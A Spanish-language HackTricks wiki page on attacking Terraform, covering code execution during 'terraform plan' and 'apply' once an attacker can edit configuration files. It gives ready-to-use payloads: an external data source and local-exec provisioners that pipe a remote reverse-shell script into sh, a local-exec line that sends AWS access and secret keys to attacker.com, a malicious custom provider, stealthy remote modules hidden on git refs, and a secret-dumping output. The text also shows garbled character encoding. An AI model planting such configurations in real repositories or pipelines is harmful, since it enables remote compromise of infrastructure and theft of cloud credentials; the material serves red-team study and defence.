# Seguridad en Terraform

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci칩n B치sica

HashiCorp Terraform es una **herramienta de infraestructura como c칩digo** que te permite definir tanto **recursos en la nube como en local** en archivos de configuraci칩n legibles por humanos que puedes versionar, reutilizar y compartir. Luego puedes usar un flujo de trabajo consistente para aprovisionar y gestionar toda tu infraestructura a lo largo de su ciclo de vida. Terraform puede gestionar componentes de bajo nivel como recursos de c칩mputo, almacenamiento y red, as칤 como componentes de alto nivel como entradas de DNS y caracter칤sticas de SaaS.

### 쮺칩mo funciona Terraform?

Terraform crea y gestiona recursos en plataformas en la nube y otros servicios a trav칠s de sus interfaces de programaci칩n de aplicaciones (APIs). Los proveedores permiten que Terraform trabaje con pr치cticamente cualquier plataforma o servicio con una API accesible.

![](<../../.gitbook/assets/image (33).png>)

HashiCorp y la comunidad de Terraform ya han escrito **m치s de 1700 proveedores** para gestionar miles de diferentes tipos de recursos y servicios, y este n칰mero sigue creciendo. Puedes encontrar todos los proveedores p칰blicamente disponibles en el [Registro de Terraform](https://registry.terraform.io/), incluyendo Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog y muchos m치s.

El flujo de trabajo central de Terraform consta de tres etapas:

* **Escribir:** Definir recursos, que pueden estar en m칰ltiples proveedores de nube y servicios. Por ejemplo, podr칤as crear una configuraci칩n para desplegar una aplicaci칩n en m치quinas virtuales en una red Virtual Private Cloud (VPC) con grupos de seguridad y un balanceador de carga.
* **Planificar:** Terraform crea un plan de ejecuci칩n describiendo la infraestructura que crear치, actualizar치 o destruir치 basado en la infraestructura existente y tu configuraci칩n.
* **Aplicar:** Con aprobaci칩n, Terraform realiza las operaciones propuestas en el orden correcto, respetando cualquier dependencia de recursos. Por ejemplo, si actualizas las propiedades de una VPC y cambias el n칰mero de m치quinas virtuales en esa VPC, Terraform recrear치 la VPC antes de escalar las m치quinas virtuales.

![](<../../.gitbook/assets/image (81).png>)

### Terraform Enterprise

Terraform Enterprise te permite **ejecutar comandos** como `terraform plan` o `terraform apply` de forma remota en una **versi칩n autoalojada de Terraform Cloud**. Por lo tanto, si encuentras la **clave API** para acceder a ese servidor de Terraform, puedes **comprometerlo**.\
Para m치s informaci칩n, consulta:

{% content-ref url="terraform-enterprise-security.md" %}
[terraform-enterprise-security.md](terraform-enterprise-security.md)
{% endcontent-ref %}

## Laboratorio de Terraform

Solo instala terraform en tu computadora.

Aqu칤 tienes una [gu칤a](https://learn.hashicorp.com/tutorials/terraform/install-cli) y aqu칤 la [mejor manera de descargar terraform](https://www.terraform.io/downloads).

## RCE en Terraform

Terraform **no tiene una plataforma que exponga una p치gina web o un servicio de red** que podamos enumerar, por lo tanto, la 칰nica forma de comprometer terraform es **poder a침adir/modificar archivos de configuraci칩n de terraform**.

Sin embargo, terraform es un componente **muy sensible** de comprometer porque tendr치 **acceso privilegiado** a diferentes ubicaciones para poder funcionar correctamente.

La principal manera para que un atacante pueda comprometer el sistema donde se ejecuta terraform es **comprometer el repositorio que almacena las configuraciones de terraform**, porque en alg칰n momento van a ser **interpretadas**.

De hecho, hay soluciones que **ejecutan terraform plan/apply autom치ticamente despu칠s de que se crea un PR**, como **Atlantis**:

{% content-ref url="../atlantis-security.md" %}
[atlantis-security.md](../atlantis-security.md)
{% endcontent-ref %}

Si puedes comprometer un archivo de terraform, hay diferentes maneras en las que puedes realizar RCE cuando alguien ejecuta `terraform plan` o `terraform apply`.

### Terraform plan

Terraform plan es el **comando m치s utilizado** en terraform y los desarrolladores/soluciones que usan terraform lo llaman todo el tiempo, por lo que la **manera m치s f치cil de obtener RCE** es asegurarte de envenenar un archivo de configuraci칩n de terraform que ejecutar치 comandos arbitrarios en un `terraform plan`.

#### Usando un proveedor externo

Terraform ofrece el [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) que proporciona una forma de interfaz entre Terraform y programas externos. Puedes usar el origen de datos `external` para ejecutar c칩digo arbitrario durante un `plan`.

Inyectar en un archivo de configuraci칩n de terraform algo como lo siguiente ejecutar치 un rev shell al ejecutar `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
#### Uso de un proveedor personalizado

Cualquiera puede escribir un [proveedor personalizado](https://learn.hashicorp.com/tutorials/terraform/provider-setup) y publicarlo en el [Registro de Terraform](https://registry.terraform.io/). Tambi칠n podr칤as intentar obtener un proveedor personalizado de un registro privado.

As칤 es:

* escribe un proveedor personalizado que ejecute alg칰n c칩digo malicioso (como exfiltrar credenciales o datos de clientes)
* publ칤calo en el Registro de Terraform
* a침ade el proveedor al c칩digo de Terraform en una rama de caracter칤sticas
* abre un PR para la rama de caracter칤sticas
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Dado que el proveedor se incorporar치 durante el `init` y ejecutar치 algo de c칩digo durante el `plan`, tienes ejecuci칩n de c칩digo arbitrario.

Puedes encontrar un ejemplo en [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

#### Usando una referencia externa

Ambas opciones mencionadas son 칰tiles pero no muy sigilosas (la segunda es m치s sigilosa pero m치s compleja que la primera). Puedes realizar este ataque de una manera **a칰n m치s sigilosa**, siguiendo estas sugerencias:

* En lugar de agregar el rev shell directamente en el archivo de terraform, puedes **cargar un recurso externo** que contenga el rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
Puede encontrar el c칩digo de rev shell en [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

* En el recurso externo, utilice la caracter칤stica **ref** para ocultar el **c칩digo de terraform rev shell en una rama** dentro del repositorio, algo as칤 como: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply se ejecutar치 para aplicar todos los cambios, tambi칠n puede abusar de 칠l para obtener RCE inyectando **un archivo Terraform malicioso con** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html)**.**\
Solo necesita asegurarse de que alg칰n payload como los siguientes termine en el archivo `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Sigue las **sugerencias de la t칠cnica anterior** para realizar este ataque de una manera **m치s sigilosa utilizando referencias externas**.

## Volcado de Secretos

Puedes obtener **valores secretos utilizados por terraform** ejecutando `terraform apply` a침adiendo al archivo de terraform algo como:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Herramientas de Auditor칤a

* [**tfsec**](https://github.com/aquasecurity/tfsec): tfsec utiliza an치lisis est치tico de tu c칩digo terraform para detectar posibles malas configuraciones.
* [**terascan**](https://github.com/tenable/terrascan): Terrascan es un analizador de c칩digo est치tico para Infraestructura como C칩digo.

## Referencias

* [Seguridad de Atlantis](../atlantis-security.md)
* [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
